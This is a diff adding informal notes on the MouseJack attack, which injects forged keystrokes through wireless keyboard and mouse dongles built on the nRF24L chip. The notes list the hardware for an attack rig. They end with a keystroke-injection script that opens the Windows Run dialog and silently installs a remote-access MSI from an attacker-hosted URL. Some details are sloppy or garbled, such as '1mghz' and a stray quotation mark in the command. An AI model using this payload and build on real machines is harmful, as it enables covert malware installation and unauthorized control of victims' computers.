@@ -1,0 +1,32 @@
+uses a widespread vulnerability to do with wireless hid devices
+known as a MouseJack attack
+wireless mice and keyboards use a seperate radio channel which doesnt check the sources of signals being recieved
+most companies who produce these devices usually use chips from other companies rather than creating their own
+the vulnerability is in a chip known as "NRF24L" and runs on 2.4ghz
+This chip is highly popular and used by a wide range of producers (dell, logitech, microsoft, hp, amazon, gigabyte, lenovo, among more)
+this chip uses the same frequencies as bluetooth and wifi, but uses only 83 frequencies that are 1mghz in width
+That the covers everything between 2.4ghz to 2.483ghz
+
+software level:
+every wireless device has its own indiviudal mac address
+the hack works by recieving the signal from a connected mouse/keyboard, and then using its mac address to send forged instructions to the computer via the connected dongle
+if a hacker were to connect via a mouse, it could still be used as a keyboard,
+	This is because both mice and keyboards are considered HID's, and this can be seen in windows device manager
+
+hardware implementation:
+to forge a signal, the hacker must have a device containing a "NRF24L" chip
+e.g. crazy radio pa usb adapter, this can be used to amplify the signal if used with a good, high range antenna by 10-15 metres
+
+crazy radio pa usb adapter or any other usb to nrf24l chip adapter
+raspberry pi zero w
+antenna
+power source (any 3.7V battery should do)
+micro sd card
+female USB-A to micro usb
+
+Command to execute remote access malware on windows:
+GUI r
+DELAY 300
+"msiexec/i http://yourhostingwebsite/maliciousfile.msi /quiet
+DELAY 300
+ENTER
